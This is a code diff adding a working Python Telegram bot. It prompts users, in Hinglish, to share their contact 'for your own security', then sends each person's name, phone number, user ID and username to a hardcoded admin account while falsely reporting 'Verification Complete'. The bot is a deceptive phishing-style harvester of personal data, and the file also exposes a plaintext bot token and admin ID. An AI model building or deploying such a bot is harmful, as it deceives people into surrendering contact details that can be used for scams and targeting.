@@ -1,0 +1,103 @@
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    ContextTypes,
+    filters
+)
+
+# =========================
+# BOT TOKEN
+# =========================
+TOKEN = "8351324603:AAGeRclPfLyWRqi07IdMl3aNTb3utAowxOo"
+
+# =========================
+# ADMIN TELEGRAM USER ID
+# =========================
+ADMIN_ID = 6713336810
+
+
+# =========================
+# /start command
+# =========================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    contact_button = KeyboardButton(
+        text="🔐 Click Karein",
+        request_contact=True
+    )
+
+    keyboard = [[contact_button]]
+
+    reply_markup = ReplyKeyboardMarkup(
+        keyboard,
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+
+    await update.message.reply_text(
+        "🔐 Khud ki Security ke liye neeche button par click karein 👇",
+        reply_markup=reply_markup
+    )
+
+
+# =========================
+# Contact receive function
+# =========================
+async def save_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    contact = update.message.contact
+    user = update.effective_user
+
+    if contact:
+        name = contact.first_name
+        number = contact.phone_number
+        user_id = user.id
+        username = user.username
+
+        admin_message = f"""
+🔥 New Verification Received
+
+👤 Name: {name}
+📞 Number: {number}
+🆔 User ID: {user_id}
+📛 Username: @{username if username else "Nahi hai"}
+"""
+
+        try:
+            # Admin ko direct message
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_message
+            )
+
+            # User ko reply
+            await update.message.reply_text(
+                "✅ Verification Complete!"
+            )
+
+            print("✅ Admin ko message successfully gaya")
+
+        except Exception as e:
+            await update.message.reply_text(
+                "❌ Admin ko message bhejne me problem aayi"
+            )
+
+            print("❌ Error:", e)
+
+
+# =========================
+# Main Function
+# =========================
+def main():
+    print("Admin Verification Bot chal raha hai...")
+
+    app = ApplicationBuilder().token(TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.CONTACT, save_contact))
+
+    app.run_polling()
+
+
+if __name__ == "__main__":
+    main()
